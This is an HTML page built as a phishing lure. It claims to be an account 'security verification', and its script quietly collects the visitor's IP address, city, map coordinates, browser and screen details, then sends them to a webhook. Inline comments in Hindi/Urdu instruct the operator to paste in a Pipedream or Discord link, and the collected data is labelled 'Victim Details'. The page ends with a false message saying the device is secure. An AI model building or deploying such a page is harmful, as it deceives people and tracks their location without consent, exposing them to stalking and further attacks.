<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check - Verify Your Account</title>
    <style>
        body { font-family: sans-serif; background-color: #f4f4f4; text-align: center; padding: 50px; }
        .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); display: inline-block; }
        #status { color: red; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>⚠️ Security Verification Required</h2>
        <p>Your account showed suspicious activity. Click below to verify your device.</p>
        <button onclick="startCheck()" style="padding: 10px 20px; cursor: pointer;">Verify Device</button>
        <p id="status"></p>
    </div>

    <script>
        // STEP 1: Yahan apna Pipedream wala link paste karein
        const webhookURL = "https://ipapi.co/json/"; 

        async function startCheck() {
            document.getElementById('status').innerText = "Analyzing device security... Please wait.";
            
            try {
                // IP aur Location hasil karne ke liye
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                const payload = {
                    content: "🚨 **New Target Data Found!**",
                    embeds: [{
                        title: "Victim Details",
                        fields: [
                            { name: "IP Address", value: data.ip || "N/A" },
                            { name: "City/Region", value: `${data.city}, ${data.region}` || "N/A" },
                            { name: "Google Maps", value: `https://www.google.com/maps?q=${data.latitude},${data.longitude}` },
                            { name: "Device Info", value: navigator.userAgent },
                            { name: "Screen Size", value: `${window.screen.width}x${window.screen.height}` }
                        ],
                        color: 16711680
                    }]
                };

                // STEP 2: Data Pipedream/Discord ko bhejna
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                document.getElementById('status').style.color = "green";
                document.getElementById('status').innerText = "Security Check Completed. Your device is now secure.";
                
            } catch (error) {
                document.getElementById('status').innerText = "Error: Please check your internet connection.";
            }
        }
    </script>
</body>
</html>
